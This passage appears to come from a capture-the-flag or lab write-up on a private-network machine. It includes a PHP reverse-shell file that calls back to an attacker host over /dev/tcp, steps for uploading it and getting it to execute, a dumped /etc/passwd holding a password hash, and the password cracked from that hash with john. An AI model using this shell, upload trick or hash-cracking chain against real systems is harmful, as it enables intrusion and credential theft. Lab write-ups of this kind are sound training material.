Upload a PHP shell file *revshell.php*:
```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/10.0.0.22/1337 0>&1'");
```

Change permission of the uploaded file until we got execute permissions. then access the file at http://10.0.0.21/revshell.php

![[Pasted image 20240420114845.png]]

/etc/passwd:
```bash
[...]
karla:x:1000:1000:karla:/home/karla:/bin/bash
[...]
harry:x:1001:1001:,,,:/home/harry:/bin/bash
sally:x:1002:1002:,,,:/home/sally:/bin/bash
goat:x:1003:1003:,,,:/home/goat:/bin/bash
oracle:$1$|O@GOeN\$PGb9VNu29e9s6dMNJKH/R0:1004:1004:,,,:/home/oracle:/bin/bash
lissy:x:1005:1005::/home/lissy:/bin/sh
```

Identify hash of oracle:
![[Pasted image 20240420120514.png]]

Crack hash with john:
![[Pasted image 20240420120255.png]]
=> password: hiphop